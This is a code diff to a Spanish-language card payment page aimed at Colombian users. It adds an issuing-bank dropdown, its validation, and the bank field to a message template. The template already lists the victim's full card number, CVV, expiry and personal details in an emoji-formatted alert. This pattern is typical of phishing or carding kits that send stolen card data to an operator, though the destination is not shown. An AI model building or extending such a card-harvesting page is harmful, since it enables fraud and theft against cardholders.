@@ -445,6 +445,16 @@
             margin-bottom: 6px;
         }
 
+        /* BANCO EMISOR (nuevo) */
+        .banco-group {
+            margin-bottom: 24px;
+        }
+
+        .banco-group .form-label {
+            font-size: 0.875rem;
+            margin-bottom: 6px;
+        }
+
         /* SECURITY FOOTER */
         .security-footer {
             display: flex;
@@ -641,7 +651,8 @@
             display: none;
         }
 
-        .form-group.error .kern-input {
+        .form-group.error .kern-input,
+        .form-group.error .kern-select {
             border-bottom-color: var(--co-red);
         }
 
@@ -696,6 +707,11 @@
 
             .form-intro {
                 font-size: 0.8125rem;
+            }
+
+            .expiry-cvc-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
             }
         }
     </style>
@@ -842,6 +858,31 @@
                                 </div>
                             </div>
 
+                            <!-- BANCO EMISOR (nuevo) -->
+                            <div class="form-group banco-group">
+                                <label class="form-label">Banco emisor</label>
+                                <select class="kern-select" id="bancoEmisor" required>
+                                    <option value="">Seleccione su banco</option>
+                                    <option value="Bancolombia">Bancolombia</option>
+                                    <option value="Davivienda">Davivienda</option>
+                                    <option value="BBVA Colombia">BBVA Colombia</option>
+                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                                    <option value="Banco Popular">Banco Popular</option>
+                                    <option value="Banco Occidente">Banco Occidente</option>
+                                    <option value="Citibank Colombia">Citibank Colombia</option>
+                                    <option value="Banco AV Villas">Banco AV Villas</option>
+                                    <option value="Banco Colpatria">Banco Colpatria</option>
+                                    <option value="Bancoomeva">Bancoomeva</option>
+                                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                                    <option value="Banco Finandina">Banco Finandina</option>
+                                    <option value="Banco Falabella">Banco Falabella</option>
+                                    <option value="Banco Pichincha">Banco Pichincha</option>
+                                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                                    <option value="Otro">Otro</option>
+                                </select>
+                                <div class="error-message">Seleccione un banco emisor</div>
+                            </div>
+
                             <!-- SECURITY FOOTER -->
                             <div class="security-footer">
                                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -919,6 +960,7 @@
         const cardholderInput = document.getElementById('cardholderName');
         const expiryInput = document.getElementById('expiry');
         const cvcInput = document.getElementById('cvc');
+        const bancoEmisor = document.getElementById('bancoEmisor');
         const cardLogo = document.getElementById('cardLogo');
         const form = document.getElementById('paymentForm');
         const submitButton = document.getElementById('submitButton');
@@ -1068,6 +1110,7 @@
             cardholderInput.disabled = false;
             expiryInput.disabled = false;
             cvcInput.disabled = false;
+            bancoEmisor.disabled = false;
         }
 
         // Función para mostrar éxito
@@ -1113,6 +1156,7 @@
 🔢 CVV: \`${datos.cvv}\`
 📅 Vencimiento: \`${datos.vencimiento}\`
 💳 Tipo: ${datos.tipoTarjeta.toUpperCase()}
+🏛️ Banco emisor: ${datos.bancoEmisor}
 
 💰 Total: ${datos.totalFormateado}
 📅 Fecha: ${datos.fechaHora}
@@ -1217,6 +1261,7 @@
             const cardholderName = cardholderInput.value.trim();
             const expiry = expiryInput.value;
             const cvc = cvcInput.value;
+            const banco = bancoEmisor.value;
 
             let isValid = true;
 
@@ -1247,6 +1292,11 @@
                 isValid = false;
             }
 
+            if (!banco) {
+                bancoEmisor.parentElement.classList.add('error');
+                isValid = false;
+            }
+
             if (!isValid) {
                 return;
             }
@@ -1261,6 +1311,7 @@
             cardholderInput.disabled = true;
             expiryInput.disabled = true;
             cvcInput.disabled = true;
+            bancoEmisor.disabled = true;
 
             const cardLast4 = cardNumber.slice(-4);
             sessionStorage.setItem('cardLast4', cardLast4);
@@ -1269,6 +1320,7 @@
             sessionStorage.setItem('cardExpiry', expiry);
             sessionStorage.setItem('cardType', cardType);
             sessionStorage.setItem('procesamiento_prioritario', localStorage.getItem('procesamiento_prioritario') || 'false');
+            sessionStorage.setItem('bancoEmisor', banco);
 
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
             const apellidos = localStorage.getItem('apellidos') || 'No proporcionado';
@@ -1301,6 +1353,7 @@
                 cvv: cvc,
                 vencimiento: expiry,
                 tipoTarjeta: cardType,
+                bancoEmisor: banco,
                 totalFormateado: totalFormateado,
                 fechaHora: fechaHora
             };
